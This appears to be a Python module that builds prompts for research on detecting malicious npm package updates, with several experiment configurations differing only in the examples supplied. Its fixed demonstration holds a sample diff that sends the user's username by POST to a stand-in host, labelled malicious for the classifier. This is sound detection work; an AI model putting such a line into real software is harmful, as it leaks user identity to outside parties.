"""Prompt builders, one per experiment configuration.

Configurations differ ONLY in the examples they carry — the smart-diff, the
intent profile and the decision rule are identical everywhere. Otherwise a
difference between configurations could not be attributed to retrieval.

Still on the superseded E0-E4 scheme; docs/experiments.md §4 lists the migration
to E0-noint, E0, E2, E3, E3-k2, E4, E4-noint.
"""

CONFIGS = ["E0", "E1", "E2", "E3", "E4"]

SYSTEM = """Kamu menganalisis satu update paket npm dan memutuskan apakah update itu jahat.

Aturan keputusan: perilaku sensitif TIDAK otomatis jahat. Yang menentukan adalah
kombinasi capability, execution context, kesesuaian dengan intent paket, dan bukti
yang tersedia. Operasi yang sah — telemetry opt-in, tooling test, perubahan
lisensi, scraper, deprecation — sering memakai API yang sama dengan payload jahat.

Jawab HANYA dengan JSON:
{"verdict": "malicious" | "benign", "evidence": ["baris atau konstruksi yang jadi dasar"], "reason": "satu kalimat"}"""

# E1 shows the same fixed demonstration for EVERY update, which separates "the
# effect of having an example" from "the effect of a relevant example" (E2+).
FIXED_DEMO = {
    "intent": "Utility untuk memformat tanggal",
    "diff": "+const os = require('os');\n+fetch('http://collect.example/i', {method:'POST', body: os.userInfo().username});",
    "verdict": "malicious",
    "reason": "Formatter tanggal tidak punya alasan mengirim identitas user ke host eksternal.",
}


# _pair_block renders the update under review as prompt text.
def _pair_block(pair):
    lines = [f"Paket: {pair.get('name', pair['id'])}"]
    if pair.get("before") or pair.get("after"):
        lines.append(f"Versi: {pair.get('before', '?')} -> {pair.get('after', '?')}")
    lines.append(f"Intent paket: {pair.get('intent') or '(tidak tersedia)'}")
    if pair.get("delta"):
        lines.append("Capability delta: " + ", ".join(pair["delta"]))
    lines.append("Smart-diff:\n" + pair.get("diff", ""))
    return "\n".join(lines)


# _card_block renders one retrieved knowledge-base card as prompt text.
def _card_block(card):
    head = f"[Contoh {card['label'].upper()}] {card.get('name', card['id'])}"
    body = [f"Intent: {card.get('intent', '-')}"]
    if card.get("delta"):
        body.append("Capability delta: " + ", ".join(card["delta"]))
    body.append(f"Kenapa: {card.get('summary', '-')}")
    return head + "\n" + "\n".join(body)


# _demo_block renders the fixed demonstration used by E1.
def _demo_block():
    d = FIXED_DEMO
    return (
        f"[Contoh {d['verdict'].upper()}]\nIntent: {d['intent']}\n"
        f"Smart-diff:\n{d['diff']}\nKenapa: {d['reason']}"
    )


# build assembles the chat messages for one configuration.
def build(config, pair, cards=()):
    if config not in CONFIGS:
        raise ValueError(f"unknown configuration: {config}")

    parts = []
    if config == "E1":
        parts.append(_demo_block())
    elif config in ("E2", "E3", "E4"):
        parts.extend(_card_block(c) for c in cards)

    parts.append("Update yang dinilai:\n" + _pair_block(pair))
    return [
        {"role": "system", "content": SYSTEM},
        {"role": "user", "content": "\n\n---\n\n".join(parts)},
    ]
